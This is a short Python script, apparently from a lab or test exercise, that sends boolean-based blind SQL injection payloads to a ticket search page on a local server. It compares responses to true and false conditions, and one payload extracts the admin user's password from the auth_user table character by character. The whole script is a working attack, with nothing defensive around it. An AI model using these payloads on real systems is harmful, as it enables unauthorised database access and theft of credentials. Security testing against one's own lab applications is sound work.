import requests
URL = "http://127.0.0.1:5001/tickets/search/"
tests = [
    "non' OR 1=1--",   # known TRUE  -> should be the 8-row page
    "non' OR 1=2--",   # known FALSE -> should be the 0-row page
    "non' OR substr((SELECT password FROM auth_user WHERE username='admin'),1,1)='p'--",
]
for t in tests:
    r = requests.get(URL, params={"q": t})
    print(len(r.text), repr(t))
    r = requests.get(URL, params={"q": t})
    print(r.status_code, r.url)          # is r.url the login page?
    print(r.text[:300])                  # does the HTML say "login"/"password"?
